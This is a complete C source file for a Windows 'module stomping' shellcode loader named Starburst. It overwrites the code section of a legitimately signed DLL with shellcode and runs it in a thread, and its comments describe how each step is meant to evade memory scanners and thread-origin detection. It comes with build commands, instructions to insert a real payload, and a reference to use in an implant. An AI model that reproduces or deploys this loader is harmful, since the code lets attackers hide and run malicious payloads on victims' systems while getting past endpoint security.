/*
 * stomper.c -- Module Stomping Loader
 *
 * Loads a legitimate, signed Windows DLL (the "sacrificial" module), locates
 * its .text section, and overwrites it with shellcode. The shellcode then
 * executes from image-backed memory, defeating VAD-based scanning and
 * thread-start-address heuristics.
 *
 * OPSEC properties:
 *   - Thread start address points to a Microsoft-signed DLL
 *   - VAD entry type is MEM_IMAGE (not MEM_PRIVATE)
 *   - Memory region is backed by a legitimate file on disk
 *   - No RWX allocations (only temporary RW during copy, then RX)
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -s stomper.c -o stomper.exe -lkernel32
 *
 * Usage:
 *   1. Replace the placeholder shellcode in sc[] with your payload
 *   2. Optionally change SACRIFICIAL_DLL to target a different module
 *   3. Compile and execute
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

#include "sacrificial_dlls.h"

/* --------------------------------------------------------------------------
 * Configuration
 * -------------------------------------------------------------------------- */

/*
 * Placeholder shellcode -- replace with your actual payload.
 * This example is a NOP sled + INT3 for testing.
 */
static unsigned char sc[] = {
    0x90, 0x90, 0x90, 0x90,  /* NOP sled */
    0xCC                      /* INT3 -- breakpoint (for testing) */
};

/* --------------------------------------------------------------------------
 * PE Parsing Helpers
 * -------------------------------------------------------------------------- */

/*
 * find_text_section -- Locate the .text section in a loaded PE image.
 *
 * Parameters:
 *   base      -- Base address of the loaded module (from LoadLibraryEx)
 *   text_addr -- [out] Receives the VA of the .text section
 *   text_size -- [out] Receives the virtual size of the .text section
 *
 * Returns:
 *   TRUE on success, FALSE if the PE is malformed or .text is not found.
 */
static BOOL find_text_section(
    HMODULE base,
    LPVOID *text_addr,
    DWORD  *text_size
) {
    BYTE *base_addr = (BYTE *)base;

    /* Verify DOS header */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base_addr;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "[!] Invalid DOS signature\n");
        return FALSE;
    }

    /* Verify NT headers */
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base_addr + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[!] Invalid NT signature\n");
        return FALSE;
    }

    /* Walk section headers to find .text */
    IMAGE_SECTION_HEADER *section = IMAGE_FIRST_SECTION(nt);
    WORD num_sections = nt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < num_sections; i++) {
        /*
         * Match by name ".text" or by characteristics (executable code).
         * Some compilers name the section differently, so we check both.
         */
        BOOL is_text_name = (memcmp(section[i].Name, ".text", 5) == 0);
        BOOL is_code_section = (section[i].Characteristics &
                                IMAGE_SCN_CNT_CODE) &&
                               (section[i].Characteristics &
                                IMAGE_SCN_MEM_EXECUTE);

        if (is_text_name || is_code_section) {
            *text_addr = base_addr + section[i].VirtualAddress;
            *text_size = section[i].Misc.VirtualSize;
            return TRUE;
        }
    }

    fprintf(stderr, "[!] .text section not found\n");
    return FALSE;
}

/* --------------------------------------------------------------------------
 * Module Stomping Logic
 * -------------------------------------------------------------------------- */

/*
 * stomp_and_execute -- Core stomping routine.
 *
 * Steps:
 *   1. Load sacrificial DLL with DONT_RESOLVE_DLL_REFERENCES to avoid
 *      executing its DllMain and resolving imports (reduces side effects).
 *   2. Find the .text section in the loaded image.
 *   3. Verify .text is large enough for the shellcode.
 *   4. Change .text protections to RW (writable).
 *   5. Copy shellcode over the beginning of .text.
 *   6. Change protections to RX (executable, not writable).
 *   7. Create a thread with start address inside .text.
 *   8. Wait for the thread to complete.
 *
 * Parameters:
 *   dll_name -- Name of the sacrificial DLL to load
 *   payload  -- Shellcode buffer
 *   payload_len -- Length of the shellcode
 *
 * Returns:
 *   0 on success, non-zero on failure.
 */
static int stomp_and_execute(
    const char    *dll_name,
    unsigned char *payload,
    SIZE_T         payload_len
) {
    HMODULE hModule;
    LPVOID  text_addr = NULL;
    DWORD   text_size = 0;
    DWORD   old_protect;
    HANDLE  hThread;
    DWORD   thread_id;

    /* Step 1: Load the sacrificial DLL
     *
     * DONT_RESOLVE_DLL_REFERENCES prevents:
     *   - DllMain execution
     *   - Import resolution
     *   - TLS callback execution
     * This minimizes side effects and avoids potential crashes from
     * initializing a DLL we are about to overwrite.
     */
    printf("[*] Loading sacrificial DLL: %s\n", dll_name);

    hModule = LoadLibraryExA(
        dll_name,
        NULL,
        DONT_RESOLVE_DLL_REFERENCES
    );

    if (hModule == NULL) {
        fprintf(stderr, "[!] LoadLibraryEx failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Module loaded at: 0x%p\n", (void *)hModule);

    /* Step 2: Find .text section */
    if (!find_text_section(hModule, &text_addr, &text_size)) {
        fprintf(stderr, "[!] Failed to locate .text section\n");
        FreeLibrary(hModule);
        return 1;
    }

    printf("[+] .text section at: 0x%p (size: %lu bytes)\n",
           text_addr, (unsigned long)text_size);

    /* Step 3: Verify .text is large enough */
    if (text_size < payload_len) {
        fprintf(stderr,
                "[!] .text section too small: %lu bytes available, "
                "%lu bytes needed\n",
                (unsigned long)text_size,
                (unsigned long)payload_len);
        fprintf(stderr,
                "[!] Choose a DLL with a larger .text section. "
                "See sacrificial_dlls.h\n");
        FreeLibrary(hModule);
        return 1;
    }

    printf("[+] .text section is large enough for payload "
           "(%lu / %lu bytes)\n",
           (unsigned long)payload_len,
           (unsigned long)text_size);

    /* Step 4: Change page protections to RW
     *
     * The .text section is initially PAGE_EXECUTE_READ (RX) because it is
     * loaded as executable code. We need to make it writable to copy our
     * shellcode into it. We use PAGE_READWRITE (not PAGE_EXECUTE_READWRITE)
     * to avoid having an RWX region, which is a detection signal.
     */
    if (!VirtualProtect(text_addr, payload_len, PAGE_READWRITE, &old_protect)) {
        fprintf(stderr, "[!] VirtualProtect (RW) failed: %lu\n",
                GetLastError());
        FreeLibrary(hModule);
        return 1;
    }

    printf("[+] Page protections changed to RW\n");

    /* Step 5: Copy shellcode over .text section */
    memcpy(text_addr, payload, payload_len);

    printf("[+] Shellcode copied to .text section (%lu bytes)\n",
           (unsigned long)payload_len);

    /* Step 6: Change protections to RX
     *
     * Restore executable permissions and remove write. This matches the
     * original protections of the .text section, so the memory region
     * looks normal to scanners.
     */
    if (!VirtualProtect(text_addr, payload_len, PAGE_EXECUTE_READ, &old_protect)) {
        fprintf(stderr, "[!] VirtualProtect (RX) failed: %lu\n",
                GetLastError());
        FreeLibrary(hModule);
        return 1;
    }

    printf("[+] Page protections restored to RX\n");

    /* Step 7: Execute from the stomped location
     *
     * CreateThread with start address pointing into the .text section of
     * the sacrificial DLL. To any observer, the thread appears to be
     * running code from a legitimate, Microsoft-signed module.
     */
    printf("[*] Creating thread at stomped .text location...\n");

    hThread = CreateThread(
        NULL,                                  /* default security */
        0,                                     /* default stack size */
        (LPTHREAD_START_ROUTINE)text_addr,     /* start in stomped .text */
        NULL,                                  /* no parameter */
        0,                                     /* run immediately */
        &thread_id
    );

    if (hThread == NULL) {
        fprintf(stderr, "[!] CreateThread failed: %lu\n", GetLastError());
        FreeLibrary(hModule);
        return 1;
    }

    printf("[+] Thread created (TID: %lu), start address: 0x%p\n",
           (unsigned long)thread_id, text_addr);

    /* Step 8: Wait for the thread to complete */
    printf("[*] Waiting for thread to finish...\n");
    WaitForSingleObject(hThread, INFINITE);

    DWORD exit_code;
    GetExitCodeThread(hThread, &exit_code);
    printf("[+] Thread exited with code: %lu\n", (unsigned long)exit_code);

    /* Cleanup */
    CloseHandle(hThread);

    /*
     * Note: We intentionally do NOT call FreeLibrary here. Freeing the
     * module would unmap the memory region, which would be bad if any
     * code is still referencing it. In a real implant, you would keep
     * the module loaded for the lifetime of the payload.
     */

    return 0;
}

/* --------------------------------------------------------------------------
 * Entry Point
 * -------------------------------------------------------------------------- */

int main(void)
{
    printf("=== Starburst Module Stomping Loader ===\n\n");

    printf("[*] Shellcode size: %lu bytes\n", (unsigned long)sizeof(sc));
    printf("[*] Sacrificial DLL: %s\n", SACRIFICIAL_DLL);
    printf("[*] Expected .text size: >= %lu bytes\n\n",
           (unsigned long)SACRIFICIAL_DLL_TEXT);

    int result = stomp_and_execute(
        SACRIFICIAL_DLL,
        sc,
        sizeof(sc)
    );

    if (result == 0) {
        printf("\n[+] Module stomping completed successfully\n");
    } else {
        fprintf(stderr, "\n[!] Module stomping failed\n");
    }

    return result;
}
